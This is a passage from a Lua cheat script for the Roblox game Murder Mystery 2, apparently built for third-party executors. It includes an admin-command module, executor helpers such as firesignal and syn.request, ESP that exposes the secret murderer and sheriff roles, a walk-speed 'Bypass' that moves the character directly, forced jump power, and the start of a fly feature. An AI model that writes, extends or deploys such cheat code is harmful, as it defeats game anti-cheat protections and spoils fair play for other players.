				whisperTo(fromPlayer.Name, "You are not whilelisted to use admin commands.")
				return
			end
			-- Check command exists
			local cmd = commands[command]
			if not cmd or not cmd.enabled then
				whisperTo(fromPlayer.Name, "Unknown or disabled command: " .. tostring(command))
				return
			end
			-- Check cooldown
			local onCd, timeLeft = isOnCooldown(fromPlayer.UserId, command)
			if onCd then
				whisperTo(fromPlayer.Name, "Please wait " .. math.ceil(timeLeft) .. "s before using /" .. command .. " again.")
				return
			end
			-- Call handler
			local ok, err = cmd.handler(args, fromPlayer)
			if not ok then
				whisperTo(fromPlayer.Name, "Error: " .. (err or "Invalid arguments."))
			end
		end

		-- Connect .Chatted for a player
		local function connectChatted(player)
			if not player or chattedConnections[player.UserId] then return end
			chattedConnections[player.UserId] = player.Chatted:Connect(function(msg)
				onChatted(player, msg)
			end)
		end

		-- Disconnect .Chatted for a player
		local function disconnectChatted(player)
			local conn = chattedConnections[player.UserId]
			if conn then
				conn:Disconnect()
				chattedConnections[player.UserId] = nil
			end
		end

		-- Public API

		-- Adds a player to the whilelist
		function MurderD0llanAdminModule.whilelist(user)
			if not user or not user.UserId then return end
			if not whilelisted[user.UserId] then
				whilelisted[user.UserId] = user
				connectChatted(user)
				-- Whisper the player if they're still in the game
				local found = Players:FindFirstChild(user.Name)
				if found then
					whisperTo(user.Name, "You have been whilelisted, Now you have commands, Use !cmds to view commands")
				end
			end
		end

		-- Removes a player from the whilelist
		function MurderD0llanAdminModule.unwhilelist(user)
			if not user or not user.UserId then return end
			if whilelisted[user.UserId] then
				disconnectChatted(user)
				whilelisted[user.UserId] = nil
				-- Whisper the player if they're still in the game
				local found = Players:FindFirstChild(user.Name)
				if found then
					whisperTo(user.Name, "You have been removed from the whilelist. you are no longer able to execute commands")
				end
			end
		end

		-- Returns the current table of whilelisted players
		function MurderD0llanAdminModule.whilelistedList()
			local list = {}
			for _, player in whilelisted do
				table.insert(list, player)
			end
			return list
		end

		-- Optional: Clean up on player removing
		Players.PlayerRemoving:Connect(function(player)
			MurderD0llanAdminModule.unwhilelist(player)
		end)

		return MurderD0llanAdminModule


	end;
};
G2L_MODULES[G2L["1e2"]] = {
	Closure = function()
		local script = G2L["1e2"];
--[[
    KeyBindBTNModule
    Allows developers to bind keyboard keys to UI buttons so that pressing a key triggers the button's MouseButton1Click event.
    API:
        .connect(keyToPress: string, button: Instance, OnFireSignalNotEnabled: function [optional])
        .disconnect(keyToPress: string)
        .update(keyToPress: string, newButton: Instance)
        .getBindings()
    Usage:
        local KeyBindBTNModule = require(path.to.KeyBindBTNModule)
        KeyBindBTNModule.connect("E", myButton, function(button)
            -- fallback logic if firesignal is not available
            button.MouseButton1Click:Fire()
        end)
--]]

		local UserInputService = game:GetService("UserInputService")

		local KeyBindBTNModule = {}
		-- bindings[key] = {button = GuiButton, fallback = function or nil}
		local bindings = {}
		local validButtonClasses = {
			TextButton = true,
			ImageButton = true,
		}
		local work_when_gui_is_hidden = false

		-- Internal: Fires the MouseButton1Click event for a button if possible
		local function fireButton(binding)
			if not binding then return end
			local button = binding.button
			local fallback = binding.fallback
			if button and button.Parent and validButtonClasses[button.ClassName] then
				-- Only fire if button is enabled and visible
				if button.Visible and button.AutoButtonColor ~= false and button.Active ~= false then
					-- Fire MouseButton1Click event using firesignal if available, else fallback
					if button.MouseButton1Click then
						if work_when_gui_is_hidden == true and script.Parent.Parent.Enabled == true then
							return
						end

						if typeof(firesignal) == "function" then
							firesignal(button.MouseButton1Click)
						elseif typeof(fallback) == "function" then
							fallback(button)
							return
						else
							-- Default fallback: try :Fire()
							if typeof(button.MouseButton1Click.Fire) == "function" then
								button.MouseButton1Click:Fire()
							end
						end
					end
				end
			end
		end

		-- Internal: Listen for key presses
		UserInputService.InputBegan:Connect(function(input, gameProcessed)
			if gameProcessed then return end
			if input.UserInputType == Enum.UserInputType.Keyboard then
				local key = input.KeyCode.Name
				local binding = bindings[key]
				fireButton(binding)
			end
		end)

		-- Defensive check for key string
		local function isValidKey(key)
			return typeof(key) == "string" and Enum.KeyCode[key] ~= nil
		end

		-- Defensive check for button instance
		local function isValidButton(button)
			return typeof(button) == "Instance" and validButtonClasses[button.ClassName]
		end

		-- Binds a key to a button, with optional fallback callback if firesignal is not available
		function KeyBindBTNModule.connect(keyToPress, button, OnFireSignalNotEnabled)
			assert(isValidKey(keyToPress), "KeyBindBTNModule.connect: keyToPress must be a valid KeyCode string")
			assert(isValidButton(button), "KeyBindBTNModule.connect: button must be a valid GuiButton (TextButton/ImageButton)")
			bindings[keyToPress] = {button = button, fallback = OnFireSignalNotEnabled}
		end

		-- Removes a key binding
		function KeyBindBTNModule.disconnect(keyToPress)
			assert(isValidKey(keyToPress), "KeyBindBTNModule.disconnect: keyToPress must be a valid KeyCode string")
			bindings[keyToPress] = nil
		end

		-- Updates an existing binding to a new button (keeps the fallback callback)
		function KeyBindBTNModule.update(keyToPress, newButton)
			assert(isValidKey(keyToPress), "KeyBindBTNModule.update: keyToPress must be a valid KeyCode string")
			assert(isValidButton(newButton), "KeyBindBTNModule.update: newButton must be a valid GuiButton (TextButton/ImageButton)")
			if bindings[keyToPress] then
				bindings[keyToPress].button = newButton
			else
				error("KeyBindBTNModule.update: No existing binding for key '" .. keyToPress .. "'")
			end
		end

		-- Returns a shallow copy of all current key-button bindings (returns button only, not fallback)
		function KeyBindBTNModule.getBindings()
			local copy = {}
			for key, binding in bindings do
				copy[key] = binding.button
			end
			return copy
		end

		function KeyBindBTNModule.set_WWGIH_Bool(bool: boolean)
			work_when_gui_is_hidden = bool
		end

		function KeyBindBTNModule.get_WWGIH_Bool()
			return work_when_gui_is_hidden
		end
		return KeyBindBTNModule
	end;
};
G2L_MODULES[G2L["1e3"]] = {
	Closure = function()
		local script = G2L["1e3"];
		-- TranslatorModule
		local HttpService = game:GetService("HttpService")
		local Players = game:GetService("Players")

		-- Excluded texts that should not be translated
		local excludedTexts = {
			"- - -  ",
			"- - - - - - - - - -  - - - - - - - - - -  - - - - - - - - - -  ",
			"MurderD0llan / Murder Mystery 2",
			"Main",
			"Target",
			"Murder",
			"Sherrif",
			"Innocent",
			"Options",
			"X",
			"+",
			"-"
		}

		local function isExcluded(text)
			for _, excluded in excludedTexts do
				if text == excluded then
					return true
				end
			end
			return false
		end

		local Translator = {}

		-- Table to store original text values for undo
		local originalTexts = {}

		local function getHttpRequest()
			return (http_request or request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request))
		end

		local function getTargetLanguage()
			local localeId = Players.LocalPlayer.LocaleId
			return string.sub(localeId, 1, 2)
		end

		function Translator.TranslateText(text, targetLang)
			local httpRequest = getHttpRequest()
			if not httpRequest then
				return nil, "No compatible HTTP request function found."
			end

			local url = "https://translate.googleapis.com/translate_a/single"
			local query = string.format("?client=gtx&sl=auto&tl=%s&dt=t&q=%s", targetLang, HttpService:UrlEncode(text))

			local success, response = pcall(function()
				return httpRequest({
					Url = url .. query,
					Method = "GET"
				})
			end)

			if not success or not response or not response.Body then
				return nil, "HTTP request failed."
			end

			local decoded
			success, decoded = pcall(function()
				return HttpService:JSONDecode(response.Body)
			end)

			if not success or not decoded then
				return nil, "JSON decoding failed."
			end

			local translated = decoded[1] and decoded[1][1] and decoded[1][1][1]
			if translated then
				return translated
			else
				return nil, "Translation not found in response."
			end
		end

		function Translator.TranslateGui(screenGui)
			local targetLang = getTargetLanguage()

			local function translateInstance(obj)
				if obj:IsA("TextLabel") or obj:IsA("TextButton") then
					if obj.Text and #obj.Text > 0 and not isExcluded(obj.Text) then
						-- Store original text if not already stored
						if not originalTexts[obj] then
							originalTexts[obj] = { Text = obj.Text }
						end
						local translated, err = Translator.TranslateText(obj.Text, targetLang)
						if translated then
							obj.Text = translated
						else
							return false, string.format("Failed to translate '%s': %s", obj.Text, err)
						end
						task.wait(0.2)
					end
				elseif obj:IsA("TextBox") then
					-- Store original text and placeholder if not already stored
					if not originalTexts[obj] then
						originalTexts[obj] = { Text = obj.Text, PlaceholderText = obj.PlaceholderText }
					end
					-- Traducir TextBox.Text
					if obj.Text and #obj.Text > 0 and not isExcluded(obj.Text) then
						local translated, err = Translator.TranslateText(obj.Text, targetLang)
						if translated then
							obj.Text = translated
						else
							return false, string.format("Failed to translate TextBox.Text '%s': %s", obj.Text, err)
						end
						task.wait(0.2)
					end
					-- Traducir TextBox.PlaceholderText
					if obj.PlaceholderText and #obj.PlaceholderText > 0 and not isExcluded(obj.PlaceholderText) then
						local translated, err = Translator.TranslateText(obj.PlaceholderText, targetLang)
						if translated then
							obj.PlaceholderText = translated
						else
							return false, string.format("Failed to translate TextBox.PlaceholderText '%s': %s", obj.PlaceholderText, err)
						end
						task.wait(0.2)
					end
				end

				for _, child in obj:GetChildren() do
					local ok, err = translateInstance(child)
					if not ok then
						return false, err
					end
				end

				return true
			end

			return translateInstance(screenGui)
		end

		function Translator.UndoTranslation(screenGui)
			-- Recursively restore original text values
			local function restoreInstance(obj)
				local original = originalTexts[obj]
				if original then
					if obj:IsA("TextLabel") or obj:IsA("TextButton") then
						if original.Text then
							obj.Text = original.Text
						end
					elseif obj:IsA("TextBox") then
						if original.Text then
							obj.Text = original.Text
						end
						if original.PlaceholderText then
							obj.PlaceholderText = original.PlaceholderText
						end
					end
				end
				for _, child in obj:GetChildren() do
					restoreInstance(child)
				end
			end
			restoreInstance(screenGui)
		end

		return Translator


	end;
};
G2L_MODULES[G2L["1e4"]] = {
	Closure = function()
		local script = G2L["1e4"];
		local UserInputService = game:GetService("UserInputService")
		local Players = game:GetService("Players")
		local GuiService = game:GetService("GuiService")

		local ButtonSelectorModule = {}
		local connection
		local selecting = false
		local instructionLabel

		local IsStudio = game:GetService("RunService"):IsStudio()
		local PathToVerify

		if IsStudio then
			PathToVerify = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
		else
			PathToVerify = game:GetService("CoreGui")
		end

		print(PathToVerify:GetFullName())
		-- Verifica si un botón está dentro de una instancia excluida
		local function isExcluded(button, excludeList)
			for _, excludedContainer in (excludeList or {}) do
				if button.Parent == excludedContainer then
					print("[ButtonSelectorModule][isExcluded] Button", button:GetFullName(), "is excluded by", excludedContainer:GetFullName())
					return true
				end
			end
			return false
		end

		-- Crea una UI temporal de instrucciones
		local function showInstructionUI(parentGui)
			if instructionLabel and instructionLabel.Parent then
				print("[ButtonSelectorModule][showInstructionUI] Destroying previous instruction label")
				instructionLabel:Destroy()
			end

			instructionLabel = Instance.new("TextLabel")
			instructionLabel.Name = "SelectionInstructions"
			instructionLabel.Size = UDim2.new(0.6, 0, 0.1, 0)
			instructionLabel.Position = UDim2.new(0.2, 0, 0.05, 0)
			instructionLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			instructionLabel.BackgroundTransparency = 0.3
			instructionLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
			instructionLabel.Font = Enum.Font.GothamBold
			instructionLabel.TextScaled = true
			instructionLabel.Text = "Right-click a button to select it..."
			instructionLabel.ZIndex = 100

			instructionLabel.Parent = parentGui
			print("[ButtonSelectorModule][showInstructionUI] Instruction label shown on", parentGui:GetFullName())

			-- Desaparece después de 5 segundos si no se selecciona nada
			task.delay(5, function()
				if instructionLabel and instructionLabel.Parent then
					print("[ButtonSelectorModule][showInstructionUI] Instruction label auto-destroyed after 5s")
					instructionLabel:Destroy()
				end
			end)
		end

		function ButtonSelectorModule.Start(rootGui: Instance, exclude: {Instance}?, SelectionNotificationCallBack: () -> (), callback: (Instance) -> ())
			if selecting then
				print("[ButtonSelectorModule][Start] Already selecting, aborting.")
				return
			end
			selecting = true
			print("[ButtonSelectorModule][Start] Selection started on", rootGui:GetFullName())

			if typeof(SelectionNotificationCallBack) == "function" then
				print("[ButtonSelectorModule][Start] Calling SelectionNotificationCallBack")
				SelectionNotificationCallBack()
			end

			showInstructionUI(rootGui)

			connection = UserInputService.InputBegan:Connect(function(input, processed)
				print("[ButtonSelectorModule][InputBegan] Input:", input.UserInputType, "Processed:", processed)
				if input.UserInputType ~= Enum.UserInputType.MouseButton2 then return end

				local mousePos = UserInputService:GetMouseLocation()
				print("[ButtonSelectorModule][InputBegan] Mouse position:", mousePos.X, mousePos.Y)
				local guiObjects = PathToVerify:GetGuiObjectsAtPosition(mousePos.X, mousePos.Y)
				print("[ButtonSelectorModule][InputBegan] GuiObjects at position:", #guiObjects)

				local button = nil
				for i, gui in guiObjects do
					print("[ButtonSelectorModule][InputBegan] Checking gui:", gui:GetFullName())
					if gui:IsA("GuiButton") and not isExcluded(gui, exclude) then
						print("[ButtonSelectorModule][InputBegan] Found selectable button:", gui:GetFullName())
						button = gui
						break
					end
				end

				if button then
					if typeof(callback) == "function" then
						print("[ButtonSelectorModule][InputBegan] Calling callback for button:", button:GetFullName())
						callback(button)
					end
					ButtonSelectorModule.Stop()
				else
					print("[ButtonSelectorModule][InputBegan] No valid button found under mouse.")
				end
			end)
		end

		function ButtonSelectorModule.Stop()
			if connection then
				print("[ButtonSelectorModule][Stop] Disconnecting input connection.")
				connection:Disconnect()
				connection = nil
			end
			if instructionLabel then
				print("[ButtonSelectorModule][Stop] Destroying instruction label.")
				instructionLabel:Destroy()
				instructionLabel = nil
			end
			selecting = false
			print("[ButtonSelectorModule][Stop] Selection stopped.")
		end

		-- Applies a one-time click connection to every button in the gui, excluding those in the exclude list
		function ButtonSelectorModule.ApplyOnceToButtons(rootGui: Instance, exclude: {Instance}?, callback: (Instance) -> ())
			if not rootGui then
				print("[ButtonSelectorModule][ApplyOnceToButtons] No rootGui provided.")
				return
			end
			print("[ButtonSelectorModule][ApplyOnceToButtons] Applying once-connection to buttons in", rootGui:GetFullName())
			for _, descendant in rootGui:GetDescendants() do
				if descendant:IsA("GuiButton") and not isExcluded(descendant, exclude) then
					print("[ButtonSelectorModule][ApplyOnceToButtons] Connecting to button:", descendant:GetFullName())
					local conn
					conn = descendant.MouseButton1Click:Connect(function()
						print("[ButtonSelectorModule][ApplyOnceToButtons] Button clicked (once):", descendant:GetFullName())
						if typeof(callback) == "function" then
							callback(descendant)
						end
						if conn then
							print("[ButtonSelectorModule][ApplyOnceToButtons] Disconnecting connection for button:", descendant:GetFullName())
							conn:Disconnect()
							conn = nil
						end
					end)
				else
					if descendant:IsA("GuiButton") then
						print("[ButtonSelectorModule][ApplyOnceToButtons] Button excluded:", descendant:GetFullName())
					end
				end
			end
		end

		return ButtonSelectorModule


	end;
};
G2L_MODULES[G2L["1e5"]] = {
	Closure = function()
		local script = G2L["1e5"];
		local Players = game:GetService("Players")
		local UserInputService = game:GetService("UserInputService")

		local KeySelectorModule = {}

		local active = false
		local connection
		local ui

		local function createOverlay()
			local playerGui = Players.LocalPlayer:WaitForChild("PlayerGui")

			local screenGui = Instance.new("ScreenGui")
			screenGui.Name = "KeySelectorOverlay"
			screenGui.ResetOnSpawn = false
			screenGui.IgnoreGuiInset = true

			local background = Instance.new("Frame")
			background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			background.BackgroundTransparency = 0.4
			background.Size = UDim2.new(1, 0, 1, 0)
			background.Position = UDim2.new(0, 0, 0, 0)
			background.Parent = screenGui

			-- Texto principal
			local mainLabel = Instance.new("TextLabel")
			mainLabel.Size = UDim2.new(1, 0, 0.2, 0)
			mainLabel.Position = UDim2.new(0, 0, 0.4, 0)
			mainLabel.BackgroundTransparency = 1
			mainLabel.Text = "Press any key to proceed with the action"
			mainLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
			mainLabel.TextScaled = true
			mainLabel.Font = Enum.Font.GothamBold
			mainLabel.Parent = screenGui

			-- Texto secundario (Escape)
			local secondaryLabel = Instance.new("TextLabel")
			secondaryLabel.Size = UDim2.new(1, 0, 0.05, 0)
			secondaryLabel.Position = UDim2.new(0, 0, 0.6, 0)
			secondaryLabel.BackgroundTransparency = 1
			secondaryLabel.Text = [[or press the "Backspace" key to cancel the process]]
			secondaryLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
			secondaryLabel.TextTransparency = 0.4
			secondaryLabel.TextScaled = true
			secondaryLabel.Font = Enum.Font.Gotham
			secondaryLabel.Parent = screenGui

			screenGui.Parent = playerGui
			ui = screenGui
		end

		local function cleanup()
			if connection then
				connection:Disconnect()
				connection = nil
			end
			if ui then
				ui:Destroy()
				ui = nil
			end
			active = false
		end

		function KeySelectorModule.Start(callback: (string) -> ())
			if active then return end
			active = true

			createOverlay()

			connection = UserInputService.InputBegan:Connect(function(input, processed)
				if processed or input.UserInputType ~= Enum.UserInputType.Keyboard then return end

				local key = input.KeyCode
				if key == Enum.KeyCode.Backspace then
					cleanup()
					return
				end

				if typeof(callback) == "function" then
					callback(key.Name)
				end

				cleanup()
			end)
		end

		function KeySelectorModule.Cancel()
			cleanup()
		end

		return KeySelectorModule

	end;
};
-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.Handler
local function C_13()
	local script = G2L["13"];

	--ESP
	local Notificaciones = {
		Error = "rbxassetid://4041673253",
		Aviso = "rbxassetid://4026367629",
		Correcto = "rbxassetid://4094488012",
	}


	local Script = {
		Buttons = {
			ESP = {
				selector = script.Parent.ChangeButton1ESP.change,
				Button = script.Parent.ESP,
				Indicator = script.Parent.ESP.Frame,
				ButtonGE = script.Parent.GunESP,
				GEIndicator = script.Parent.GunESP.Frame
			}
		}
	}

	local Loops = {
		ESP = {
			TypeOf = "Everyone";
			Active = false;
			ActiveGE = false;
		}
	}

	local localplayer = game:GetService("Players").LocalPlayer
	local Players = game:GetService("Players")
	local playerData = {}
	local ListOfEsp = {}
	local EspColors = {}

	-- Helpers
	local Help_Functions = {
		findMurderer = function()
			for _, i in ipairs(Players:GetPlayers()) do
				if i.Backpack:FindFirstChild("Knife") or (i.Character and i.Character:FindFirstChild("Knife")) or i.Backpack:FindFirstChild("knife") or (i.Character and i.Character:FindFirstChild("knife")) then
					return i
				end
			end
			for player, data in pairs(playerData) do
				if data.Role == "Murderer" and Players:FindFirstChild(player) then
					return Players:FindFirstChild(player)
				end
			end
			return nil
		end,

		findSheriff = function()
			for _, i in ipairs(Players:GetPlayers()) do
				if i.Backpack:FindFirstChild("Gun") or (i.Character and i.Character:FindFirstChild("Gun")) then
					return i
				end
			end
			for player, data in pairs(playerData) do
				if data.Role == "Sheriff" and Players:FindFirstChild(player) then
					return Players:FindFirstChild(player)
				end
			end
			return nil
		end,

		findSheriffThatsNotMe = function()
			for _, i in ipairs(Players:GetPlayers()) do
				if i ~= localplayer and (i.Backpack:FindFirstChild("Gun") or (i.Character and i.Character:FindFirstChild("Gun"))) then
					return i
				end
			end
			for player, data in pairs(playerData) do
				if data.Role == "Sheriff" and Players:FindFirstChild(player) and Players:FindFirstChild(player) ~= localplayer then
					return Players:FindFirstChild(player)
				end
			end
			return nil
		end
	}

	-- Color config
	local function getColorForPlayer(player)
		if player == Help_Functions.findMurderer() then
			return Color3.fromRGB(255, 0, 0) -- red
		elseif player == Help_Functions.findSheriffThatsNotMe() then
			return Color3.fromRGB(0, 0, 255) -- blue
		else
			return Color3.fromRGB(0, 255, 0) -- green
		end
	end

	-- ESP control
	local function CreateESP(player)
		if not player.Character then return end
		if ListOfEsp[player] then return end

		local torso = player.Character:FindFirstChild("HumanoidRootPart")
		if not torso then return end

		local esp = Instance.new("BoxHandleAdornment")
		esp.Name = "ESP"
		esp.Adornee = torso
		esp.Size = player.Character:GetExtentsSize()
		esp.AlwaysOnTop = true
		esp.ZIndex = 5
		esp.Transparency = 0.5
		esp.Color3 = getColorForPlayer(player)
		esp.Parent = torso

		ListOfEsp[player] = esp
	end


	local function TemporalCreateESPForModel(Model: Model)
		local esp = Instance.new("BoxHandleAdornment")
		esp.Name = "ESP"
		esp.Adornee = Model.PrimaryPart or Model
		esp.Size = Model:GetExtentsSize()
		esp.AlwaysOnTop = true
		esp.ZIndex = 5
		esp.Transparency = 0.5
		esp.Color3 = Color3.new(1, 1, 0)
		esp.Parent = Model
	end


	local function RemoveESP(player)
		if ListOfEsp[player] then
			ListOfEsp[player]:Destroy()
			ListOfEsp[player] = nil
		end
	end

	local function ESP(TypeOfESP)
		for _, player in ipairs(Players:GetPlayers()) do
			if player == localplayer then continue end

			local add = false
			if TypeOfESP == "Everyone" then
				add = true
			elseif TypeOfESP == "Blue & Red" then
				local isM = player == Help_Functions.findMurderer()
				local isS = player == Help_Functions.findSheriffThatsNotMe()
				add = isM or isS
			elseif TypeOfESP == "Murder" then
				add = player == Help_Functions.findMurderer()
			elseif TypeOfESP == "Sheriff" then
				add = player == Help_Functions.findSheriffThatsNotMe()
			elseif TypeOfESP == "dependent" then
				if Help_Functions.findMurderer() == localplayer then
					add = player == Help_Functions.findSheriffThatsNotMe() or player ~= localplayer
				elseif Help_Functions.findSheriff() == localplayer then
					add = player == Help_Functions.findMurderer()
				else
					add = true
				end
			end

			if add then
				CreateESP(player)
			else
				RemoveESP(player)
			end
		end
	end

	local function UnESP()
		for player, _ in pairs(ListOfEsp) do
			RemoveESP(player)
		end
	end
	-- Activar / Desactivar ESP
	Script.Buttons.ESP.Button.MouseButton1Click:Connect(function()
		Loops.ESP.Active = not Loops.ESP.Active
		Script.Buttons.ESP.Button:SetAttribute("Debug_Text", "Esp - "..tostring(Loops.ESP.Active))
		Script.Buttons.ESP.Indicator.BackgroundColor3 = Loops.ESP.Active and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
		if Loops.ESP.Active then
			ESP(Loops.ESP.TypeOf)
			task.spawn(function()
				while Loops.ESP.Active do
					ESP(Loops.ESP.TypeOf)
					task.wait(1)
				end
			end)
		else
			UnESP()
		end
	end)

	Script.Buttons.ESP.ButtonGE.MouseButton1Click:Connect(function()
		Loops.ESP.ActiveGE = not Loops.ESP.ActiveGE
		Script.Buttons.ESP.GEIndicator.BackgroundColor3 = Loops.ESP.ActiveGE and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
		Script.Buttons.ESP.ButtonGE:SetAttribute("Debug_Text", "Gun Esp - "..tostring(Loops.ESP.ActiveGE))

	end)
	-- Cambiar tipo de ESP
	local types = { "Everyone", "Blue & Red", "Sheriff", "Murder", "dependent" }
	local index = 1
	Script.Buttons.ESP.selector.MouseButton1Click:Connect(function()
		index += 1
		if index > #types then index = 1 end
		Loops.ESP.TypeOf = types[index]
		Script.Buttons.ESP.selector.Parent.Text = string.format("  Type Of Esp - %s", types[index])
		Script.Buttons.ESP.selector.Parent:SetAttribute("Debug_Text", string.format("Type Of Esp - %s", types[index]))
		if Loops.ESP.Active then
			UnESP()
			ESP(Loops.ESP.TypeOf)
		end
	end)

	-- Eventos de entrada/salida
	Players.PlayerAdded:Connect(function(plr)
		plr.CharacterAdded:Connect(function()
			wait(1)
			if Loops.ESP.Active then
				ESP(Loops.ESP.TypeOf)
			end
		end)
	end)

	Players.PlayerRemoving:Connect(function(plr)
		RemoveESP(plr)
	end)

	-- Evento para detectar nuevo Héroe
	workspace.DescendantRemoving:Connect(function(obj)
		if obj.Name == "GunDrop" then
			task.delay(1, function()
				local newSheriff = Help_Functions.findSheriffThatsNotMe()
				if newSheriff and ListOfEsp[newSheriff] then
					ListOfEsp[newSheriff].Color3 = Color3.fromRGB(255, 255, 0) -- Amarillo
				end
			end)
		end
	end)

	workspace.DescendantAdded:Connect(function(obj)
		if obj.Name == "GunDrop" and Loops.ESP.ActiveGE then
			--add a box handle addornment to the model
			TemporalCreateESPForModel(obj)
		elseif obj.Name == "trap" and Loops.ESP.ActiveGE then
			TemporalCreateESPForModel(obj)

		end
	end)





	local xdd = {
		Buttons = {
			WalkSpeed = {
				ChangeTypeOf = script.Parent.ChangeButton2WalkSpeed.change,
				Button = script.Parent.WalkSpeed,
				Indicator = script.Parent.WalkSpeed.Frame,
				ChangeWalkSpeed = script.Parent.TextBoxButton1WalkSpeed.TextBox
			}
		}
	}

	local Loops = {
		WalkSpeed = {
			TypeOf = "Normal",
			Active = false,
			SelectedWalkSpeed = 16
		}
	}

	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local LocalPlayer = Players.LocalPlayer

	local heartbeatConnection = nil
	local normalLoop = nil

	local function isNumber(val)
		return tonumber(val) ~= nil
	end

	-- Función para iniciar modo Bypass
	local function startBypass()
		local chr = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
		local hum = chr:FindFirstChildOfClass("Humanoid")

		if heartbeatConnection then
			heartbeatConnection:Disconnect()
		end

		heartbeatConnection = RunService.Heartbeat:Connect(function()
			if not Loops.WalkSpeed.Active then return end
			chr = LocalPlayer.Character
			hum = chr and chr:FindFirstChildOfClass("Humanoid")
			if chr and hum and hum.Parent then
				if hum.MoveDirection.Magnitude > 0 then
					local tspeed = Loops.WalkSpeed.SelectedWalkSpeed
					if tspeed and isNumber(tspeed) then
						chr:TranslateBy(hum.MoveDirection * tonumber(tspeed))
					else
						chr:TranslateBy(hum.MoveDirection)
					end
				end
			end
		end)
	end

	-- Detener modo Bypass
	local function stopBypass()
		if heartbeatConnection then
			heartbeatConnection:Disconnect()
			heartbeatConnection = nil
		end
	end

	-- Detener modo Normal
	local function stopNormal()
		if normalLoop then
			normalLoop = nil
		end
	end

	-- Iniciar modo Normal
	local function startNormal()
		local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
		local humanoid = character:FindFirstChildOfClass("Humanoid")

		normalLoop = task.spawn(function()
			while Loops.WalkSpeed.Active and humanoid and humanoid.Parent do
				if humanoid.WalkSpeed ~= Loops.WalkSpeed.SelectedWalkSpeed then
					humanoid.WalkSpeed = Loops.WalkSpeed.SelectedWalkSpeed
				end
				task.wait(0.1)
			end
		end)
	end

	-- ✅ Cambio del tipo de velocidad con reactivación si está activo
	xdd.Buttons.WalkSpeed.ChangeTypeOf.MouseButton1Click:Connect(function()
		local wasActive = Loops.WalkSpeed.Active

		-- Desactivar temporalmente si está activo
		if wasActive then
			Loops.WalkSpeed.Active = false
			stopBypass()
			stopNormal()
		end

		-- Cambiar tipo
		if Loops.WalkSpeed.TypeOf == "Normal" then
			Loops.WalkSpeed.TypeOf = "Bypass"
			xdd.Buttons.WalkSpeed.ChangeTypeOf.Parent.Text = "  Type Of Speed - Bypass"
		else
			Loops.WalkSpeed.TypeOf = "Normal"
			xdd.Buttons.WalkSpeed.ChangeTypeOf.Parent.Text = "  Type Of Speed - Normal"
		end

		-- Reactivar si estaba activo antes
		if wasActive then
			Loops.WalkSpeed.Active = true
			if Loops.WalkSpeed.TypeOf == "Bypass" then
				startBypass()
			else
				startNormal()
			end
		end
	end)

	-- Cambiar velocidad desde el TextBox
	xdd.Buttons.WalkSpeed.ChangeWalkSpeed.FocusLost:Connect(function()
		local input = tonumber(xdd.Buttons.WalkSpeed.ChangeWalkSpeed.Text)
		if input then
			Loops.WalkSpeed.SelectedWalkSpeed = input
		end
	end)

	-- Toggle de activación principal
	xdd.Buttons.WalkSpeed.Button.MouseButton1Click:Connect(function()
		Loops.WalkSpeed.Active = not Loops.WalkSpeed.Active
		xdd.Buttons.WalkSpeed.Indicator.BackgroundColor3 = Loops.WalkSpeed.Active and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)

		local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
		local humanoid = character:FindFirstChildOfClass("Humanoid")

		if Loops.WalkSpeed.Active then
			if Loops.WalkSpeed.TypeOf == "Normal" then
				startNormal()
			else
				startBypass()
			end
		else
			stopNormal()
			stopBypass()
			if humanoid then
				humanoid.WalkSpeed = 16
			end
		end
	end)



	-- JUMP POWER

	local opa = {
		Buttons = {
			JumpPower = {
				Button = script.Parent.JumpPower,
				Indicator = script.Parent.JumpPower.Frame,
				ChangeJumpPower = script.Parent.TextBoxButton1JumpPower.TextBox
			}
		}
	}

	local Loopss = {
		JumpPower = {
			Active = false,
			SelectedJumpPower = 50
		}
	}

	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local RunService = game:GetService("RunService")

	local jumpLoop = nil

	local function applyJumpPowerLoop()
		if jumpLoop then
			task.cancel(jumpLoop)
		end

		jumpLoop = task.spawn(function()
			while Loopss.JumpPower.Active do
				local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if humanoid and humanoid.Parent then
					if humanoid.JumpPower ~= Loopss.JumpPower.SelectedJumpPower then
						humanoid.JumpPower = Loopss.JumpPower.SelectedJumpPower
					end
				end
				task.wait(0.1)
			end
		end)
	end

	local function stopJumpLoop()
		if jumpLoop then
			task.cancel(jumpLoop)
			jumpLoop = nil
		end
	end

	-- Escuchar cambios de texto en JumpPower
	opa.Buttons.JumpPower.ChangeJumpPower.FocusLost:Connect(function(enterPressed)
		print("TextBox perdió el foco, Enter presionado:", enterPressed)
		local input = tonumber(opa.Buttons.JumpPower.ChangeJumpPower.Text)
		print(input)
		if input then
			Loopss.JumpPower.SelectedJumpPower = input
		end
	end)

	-- Botón de activar/desactivar JumpPower
	opa.Buttons.JumpPower.Button.MouseButton1Click:Connect(function()
		Loopss.JumpPower.Active = not Loopss.JumpPower.Active
		opa.Buttons.JumpPower.Indicator.BackgroundColor3 = Loopss.JumpPower.Active and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)

		if Loopss.JumpPower.Active then
			applyJumpPowerLoop()
		else
			stopJumpLoop()
			local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
			local humanoid = character:FindFirstChildOfClass("Humanoid")
			if humanoid then
				humanoid.JumpPower = 50
			end
		end
	end)


	--FLY



	local Signal1, Signal2

	local function mobilefly(speed)
		local controlModule = require(game.Players.LocalPlayer.PlayerScripts:WaitForChild('PlayerModule'):WaitForChild("ControlModule"))
